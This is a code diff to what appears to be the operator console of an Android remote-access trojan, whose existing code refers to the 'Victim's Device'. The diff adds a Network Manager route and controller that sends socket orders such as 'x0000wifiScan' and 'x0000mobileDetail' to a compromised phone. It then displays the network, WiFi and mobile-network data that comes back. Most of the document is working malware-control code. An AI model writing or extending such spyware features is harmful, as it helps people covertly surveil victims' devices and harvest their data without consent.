@@ -61,6 +61,10 @@ app.config(function ($routeProvider) {
         .when("/utilities", {
             templateUrl: "./views/utilities.html",
             controller: "UtilitiesCtrl"
+        })
+        .when("/networkManager", {
+            templateUrl: "./views/networkManager.html",
+            controller: "NetworkManagerCtrl"
         });
 });
 
@@ -2217,5 +2221,126 @@ app.controller("LocCtrl", function ($scope, $rootScope) {
             }
         } else
             $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
+    });
+});
+
+//-----------------------NETWORK MANAGER Controller------------------------
+app.controller("NetworkManagerCtrl", function ($scope, $rootScope) {
+    $networkCtrl = $scope;
+
+    // Network data storage
+    $networkCtrl.networkData = null;
+    $networkCtrl.wifiNetworks = null;
+    $networkCtrl.isLoadingNetwork = false;
+    $networkCtrl.networkError = null;
+
+    // Get general network information
+    $networkCtrl.getNetworkInfo = () => {
+        $networkCtrl.isLoadingNetwork = true;
+        $networkCtrl.networkError = null;
+        $rootScope.Log('Getting network information...', CONSTANTS.logStatus.SUCCESS);
+
+        socket.emit(ORDER, { order: 'x0000net' });
+    };
+
+    // Get WiFi information
+    $networkCtrl.getWifiInfo = () => {
+        $networkCtrl.isLoadingNetwork = true;
+        $networkCtrl.networkError = null;
+        $rootScope.Log('Getting WiFi information...', CONSTANTS.logStatus.SUCCESS);
+
+        socket.emit(ORDER, { order: 'x0000wifi' });
+    };
+
+    // Scan available WiFi networks
+    $networkCtrl.scanWifiNetworks = () => {
+        $networkCtrl.isLoadingNetwork = true;
+        $networkCtrl.networkError = null;
+        $rootScope.Log('Scanning WiFi networks...', CONSTANTS.logStatus.SUCCESS);
+
+        socket.emit(ORDER, { order: 'x0000wifiScan' });
+    };
+
+    // Get mobile network information
+    $networkCtrl.getMobileInfo = () => {
+        $networkCtrl.isLoadingNetwork = true;
+        $networkCtrl.networkError = null;
+        $rootScope.Log('Getting mobile network information...', CONSTANTS.logStatus.SUCCESS);
+
+        socket.emit(ORDER, { order: 'x0000mobile' });
+    };
+
+    // Get detailed mobile network information
+    $networkCtrl.getMobileDetail = () => {
+        $networkCtrl.isLoadingNetwork = true;
+        $networkCtrl.networkError = null;
+        $rootScope.Log('Getting detailed mobile network information...', CONSTANTS.logStatus.SUCCESS);
+
+        socket.emit(ORDER, { order: 'x0000mobileDetail' });
+    };
+
+    // Socket event listeners for network responses
+    socket.on('x0000net', (data) => {
+        $networkCtrl.isLoadingNetwork = false;
+        if (data.error) {
+            $networkCtrl.networkError = data.error;
+            $rootScope.Log('Network info error: ' + data.error, CONSTANTS.logStatus.FAIL);
+        } else {
+            $networkCtrl.networkData = data;
+            $networkCtrl.networkData.timestamp = new Date();
+            $rootScope.Log('Network information received successfully', CONSTANTS.logStatus.SUCCESS);
+        }
+        $networkCtrl.$apply();
+    });
+
+    socket.on('x0000wifi', (data) => {
+        $networkCtrl.isLoadingNetwork = false;
+        if (data.error) {
+            $networkCtrl.networkError = data.error;
+            $rootScope.Log('WiFi info error: ' + data.error, CONSTANTS.logStatus.FAIL);
+        } else {
+            $networkCtrl.networkData = data;
+            $networkCtrl.networkData.timestamp = new Date();
+            $rootScope.Log('WiFi information received successfully', CONSTANTS.logStatus.SUCCESS);
+        }
+        $networkCtrl.$apply();
+    });
+
+    socket.on('x0000wifiScan', (data) => {
+        $networkCtrl.isLoadingNetwork = false;
+        if (data.error) {
+            $networkCtrl.networkError = data.error;
+            $rootScope.Log('WiFi scan error: ' + data.error, CONSTANTS.logStatus.FAIL);
+        } else {
+            $networkCtrl.wifiNetworks = data;
+            $rootScope.Log('WiFi networks scan completed: ' + (data ? data.length : 0) + ' networks found', CONSTANTS.logStatus.SUCCESS);
+        }
+        $networkCtrl.$apply();
+    });
+
+    socket.on('x0000mobile', (data) => {
+        $networkCtrl.isLoadingNetwork = false;
+        if (data.error) {
+            $networkCtrl.networkError = data.error;
+            $rootScope.Log('Mobile info error: ' + data.error, CONSTANTS.logStatus.FAIL);
+        } else {
+            $networkCtrl.networkData = data;
+            $networkCtrl.networkData.timestamp = new Date();
+            $rootScope.Log('Mobile network information received successfully', CONSTANTS.logStatus.SUCCESS);
+        }
+        $networkCtrl.$apply();
+    });
+
+    socket.on('x0000mobileDetail', (data) => {
+        $networkCtrl.isLoadingNetwork = false;
+        if (data.error) {
+            $networkCtrl.networkError = data.error;
+            $rootScope.Log('Mobile detail error: ' + data.error, CONSTANTS.logStatus.FAIL);
+        } else {
+            $networkCtrl.networkData = data;
+            $networkCtrl.networkData.timestamp = new Date();
+            $rootScope.Log('Detailed mobile network information received successfully', CONSTANTS.logStatus.SUCCESS);
+        }
+        $networkCtrl.$apply();
     });
 });
